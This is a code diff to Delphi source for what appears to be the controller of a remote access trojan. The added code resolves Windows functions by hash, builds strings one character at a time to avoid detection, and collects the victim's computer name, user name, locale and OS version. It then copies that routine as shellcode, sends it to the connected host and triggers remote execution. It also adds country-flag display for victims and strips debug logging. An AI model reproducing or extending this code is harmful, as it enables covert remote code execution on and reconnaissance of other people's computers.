@@ -25,10 +25,54 @@ type
     procedure Cleanup;
     procedure ReadData;
     function SendBuffer(bySocketCmd: Byte; lpszBuffer: Pointer; iBufferLen: Integer): Boolean;
+    procedure RequestInformation();
   end;
 implementation
 
-uses Unit1, untControl, untFilemanager;
+uses Unit1, untControl, untFilemanager, untUtils, untFlag;
+
+procedure SendInformation(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
+var
+  pComputerName:array[0..100] of WideChar;
+  pUserName:array[0..100] of WideChar;
+  pCountry:array[0..100] of WideChar;
+  pFullInformations:PWideChar;
+  strCMP:Array[0..17] of WideChar;
+  OsVinfo: TOSVERSIONINFOA;
+  dwMajor, dwMinor:Cardinal;
+  xGetComputerNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
+  xGetUserNameW:function(lpBuffer: PWideChar; var nSize: DWORD): BOOL; stdcall;
+  xGetLocaleInfoW:function(Locale: LCID; LCType: LCTYPE; lpLCData: LPWSTR; cchData: Integer): Integer; stdcall;
+  xGetVersionExA:function(var lpVersionInformation: TOSVersionInfoA): BOOL; stdcall;
+begin
+  xGetComputerNameW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $4E5771A7, 16);
+  xGetUserNameW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hAdvapi32, $ADA2AFC2, 12);
+  xGetLocaleInfoW := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $854B387C, 14);
+  xGetVersionExA := pConn.pAPI.xGetProcAddressEx(pConn.pAPI.hKernel32, $DF87764A, 13);
+  strCMP[0]:='%';strCMP[1]:='s';strCMP[2]:='@';strCMP[3]:='%';strCMP[4]:='s';strCMP[5]:='|';strCMP[6]:='%';strCMP[7]:='d';strCMP[8]:='|';strCMP[9]:='%';strCMP[10]:='s';strCMP[11]:='|';strCMP[12]:='%';strCMP[13]:='d';strCMP[14]:='.';strCMP[15]:='%';strCMP[16]:='d';strCMP[17]:=#0;
+
+  dwLen := 100;
+  //pConn.pAPI.xZeroMemory(pComputerName, dwLen);
+  xGetComputernameW(@pComputerName[0], dwLen);
+
+  dwLen := 100;
+  //pConn.pAPI.xZeroMemory(pUserName[0], dwLen);
+  xGetUserNameW(@pUserName[0], dwLen);
+
+  pConn.pAPI.xZeroMemory(OsVinfo, SizeOf(OsVinfo));
+  OsVinfo.dwOSVersionInfoSize := SizeOf(TOSVERSIONINFOA);
+  xGetVersionExA(OsVinfo);
+
+  xGetLocaleInfoW(LOCALE_USER_DEFAULT,LOCALE_SABBREVLANGNAME, @pCountry[0], dwLen);
+  pFullInformations := pConn.pAPI.xAllocMem(pConn.pAPI, 1024);
+  if pFullInformations <> nil then
+  begin
+    pConn.pAPI.xwsprintfW(pFullInformations, @strCMP[0], @pComputerName[0], @pUsername[0], 100, @pCountry[0], OsVinfo.dwMajorVersion, OsVinfo.dwMinorVersion);
+    pConn.xSendBuffer(pConn, CMD_ONLINE, pFullInformations, pConn.pAPI.xlstrlenW(pFullInformations) * 2, False);
+    pConn.pAPI.xFreeMem(pConn.pAPI, pFullInformations);
+  end;
+end;
+procedure SendInformation_END(); begin end;
 
 procedure TClientThread.ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
 var
@@ -48,7 +92,9 @@ begin
             lstItem.Caption := mySocket.RemoteAddress;
             lstItem.ImageIndex := 0;
             lstItem.SubItems.Add(lstTokens[0]);
+            lstItem.SubItems.Add('');
             lstItem.SubItems.Add(lstTokens[1]);
+            lstItem.ImageIndex := GetFlag(lstTokens[2]);
             lstItem.SubItems.Objects[0] := Self;
           end;
         end else begin
@@ -140,6 +186,33 @@ begin
   frmControl := nil;
 end;
 
+procedure TClientThread.RequestInformation();
+var
+  dwProcLen:Cardinal;
+  pShell:PShellCode;
+begin
+  dwProcLen := DWORD(@SendInformation_END) - DWORD(@SendInformation);
+  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
+  if pShell <> nil then
+  begin
+    pShell.dwLen := dwProcLen;
+    pShell.dwID := 0;
+    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), @SendInformation, pShell.dwLen);
+    SendBuffer(CMD_SHELLCODE_NEW,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
+    FreeMem(pShell);
+  end;
+
+  dwProcLen := 0;
+  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
+  if pShell <> nil then
+  begin
+    pShell.dwLen := dwProcLen;
+    pShell.dwID := 0;
+    SendBuffer(CMD_SHELLCODE_CALL,pShell,dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
+    FreeMem(pShell);
+  end;
+end;
+
 procedure TClientThread.ReadData();
 var
   DataSize, dwBuffLen: Cardinal;
@@ -155,17 +228,10 @@ begin
   DataSize := pSocketHeader.dwPacketLen;
   bByte := pSocketHeader.bCommand;
   dwBuffLen := Length(Data) - SizeOf(TSocketHeader);
-  Outputdebugstring(PChar('-------------------'));
-  Outputdebugstring(PChar('ReadData() called'));
-  Outputdebugstring(PChar('Datasize: ' + inttostr(DataSize)));
-  Outputdebugstring(PChar('dwBuffLen: ' + inttostr(dwBuffLen)));
   if DataSize > dwBuffLen then exit;
   Delete(Data,1, SizeOf(TSocketHeader));
   mData := Copy(Data,1,DataSize);
   Delete(Data,1, DataSize);
-  //Dec(DataSize);
-  Outputdebugstring(PChar('New Packet!'));
-  Outputdebugstring(PChar('mData: ' + mData));
   ParsePacket(@mData[1], DataSize, bByte);
   if Length(Data) > 0 then begin
     ReadData;
